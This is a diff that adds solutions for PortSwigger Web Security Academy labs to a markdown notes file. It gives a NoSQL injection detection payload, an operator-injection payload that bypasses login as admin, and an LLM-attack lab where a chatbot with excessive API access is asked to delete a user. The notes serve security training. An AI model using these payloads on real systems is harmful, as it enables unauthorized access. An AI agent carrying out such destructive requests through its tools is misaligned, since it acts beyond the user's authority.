@@ -1906,3 +1906,33 @@ EOF
 
 hurl -k -x 127.0.0.1:8080 r.hurl --output -
 ```
+
+## NoSQL
+
+### Lab: Detecting NoSQL injection
+
+    https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
+
+Solution:
+
+    /filter?category='||1||'
+
+### Lab: Exploiting NoSQL operator injection to bypass authentication
+
+    https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
+
+Solution:
+
+    {"username":{"$regex":"admin.*"},"password":{"$ne":""}}
+
+## Web LLM attacks
+
+### Lab: Exploiting LLM APIs with excessive agency
+
+    https://portswigger.net/web-security/llm-attacks/lab-exploiting-llm-apis-with-excessive-agency
+
+Solution:
+
+Go to: `https://0ab9003504eb476384a87565007c0045.web-security-academy.net/chat`
+
+Send: `I would like to delete user named carlos`
